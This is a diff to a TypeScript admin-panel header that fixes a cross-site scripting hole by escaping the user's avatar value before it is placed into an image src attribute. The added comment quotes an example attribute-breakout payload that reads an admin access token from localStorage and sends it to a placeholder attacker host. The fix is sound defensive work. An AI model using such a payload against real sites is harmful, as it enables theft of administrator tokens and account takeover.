@@ -134,7 +134,11 @@ export function renderHeader(container: HTMLElement, session: Session, maintenan
   // User dropdown
   const userLi = document.createElement("li");
   userLi.className = "dropdown user user-menu";
-  const avatarSrc = session.avatar ? `/profile/${session.avatar}` : "/admin/legacy-skin/img/user.png";
+  // FE-P0-002 / FIN-P1-01: session.avatar comes from backend; escape it before
+  // injecting into an `src=...` attribute. A malicious display-name-style
+  // payload like `x" onerror="fetch('//attacker?'+localStorage.adminAccessToken)`
+  // would otherwise break out of the attribute.
+  const avatarSrc = session.avatar ? `/profile/${escapeHtml(session.avatar)}` : "/admin/legacy-skin/img/user.png";
   userLi.innerHTML = `
     <a href="#" class="dropdown-toggle" data-toggle="dropdown">
       <img src="${avatarSrc}" class="img-circle" alt="User Image" width="50px" height="50px">
